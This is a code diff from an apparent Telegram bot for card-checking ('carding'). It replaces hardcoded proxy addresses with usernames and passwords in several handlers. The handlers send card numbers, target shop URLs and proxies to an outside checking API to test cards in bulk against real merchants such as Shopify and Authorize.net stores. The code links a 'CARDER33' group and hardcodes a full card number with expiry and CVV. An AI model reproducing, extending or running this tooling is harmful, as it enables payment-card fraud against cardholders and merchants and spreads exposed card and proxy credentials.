@@ -2613,7 +2613,7 @@ logger = logging.getLogger(__name__)
 import urllib.parse
 
 AUTOSH_BASE = "https://autosh.arpitchk.shop/puto.php/"
-DEFAULT_PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
+DEFAULT_PROXY = "67.227.113.12:5552:juftilus:atasaxde44jl"
 
 async def changeshsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global CURRENT_SHOPIFY_SITE
@@ -2920,7 +2920,7 @@ logger = logging.getLogger(__name__)
 import urllib.parse
 
 AUTOSH_BASE = "https://autosh.arpitchk.shop/puto.php/"
-HC_PROXY = "107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+HC_PROXY = "31.59.27.148:6725:juftilus:atasaxde44jl"
 
 async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     """
@@ -3164,7 +3164,7 @@ logger = logging.getLogger(__name__)
 import urllib.parse
 
 AUTOSH_BASE = "https://autosh.arpitchk.shop/puto.php/"
-ST1_PROXY = "107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+ST1_PROXY = "23.27.184.87:5688:juftilus:atasaxde44jl"
 ST1_SITE = "https://vasileandpavel.com"
 
 async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
@@ -3691,7 +3691,7 @@ logger = logging.getLogger(__name__)
 
 # --- Config ---
 AUTOSH_AT_API = "https://autosh.arpitchk.shop/puto.php/"
-DEFAULT_PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
+DEFAULT_PROXY = "82.29.225.78:5933:juftilus:atasaxde44jl"
 AUTHNET_DEFAULT_SITE = "https://upperlimitsupplements.com"
 
 
@@ -3944,7 +3944,7 @@ async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
         "https://autosh.arpitchk.shop/puto.php/"
         f"?site={site_input}"
         f"&cc={cc_input}"
-        "&proxy=142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
+        "&proxy=23.27.209.235:6254:juftilus:atasaxde44jl"
     )
 
     BULLET_GROUP_LINK = "https://t.me/CARDER33"
@@ -4111,7 +4111,7 @@ API_CHECK_TEMPLATE = (
     "https://autosh.arpitchk.shop/puto.php"
     "?site={site}"
     "&cc={card}"
-    "&proxy=142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
+    "&proxy=92.113.7.244:6970:juftilus:atasaxde44jl"
 )
 
 # ===== Main Command =====
@@ -4342,7 +4342,7 @@ API_TEMPLATE = (
     "https://autosh.arpitchk.shop/puto.php"
     "?site={site_url}"
     "&cc=4312311807552605|08|2031|631"
-    "&proxy=142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
+    "&proxy=104.252.49.178:6114:juftilus:atasaxde44jl"
 )
 
 # === Credit system ===
@@ -4790,7 +4790,7 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
     }
 
     async with httpx.AsyncClient() as session:
-        proxy = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
+        proxy = "192.198.126.20:7063:juftilus:atasaxde44jl"
 
         async def check_one(card, site):
             card_str = "|".join(card) if isinstance(card, (tuple, list)) else str(card)
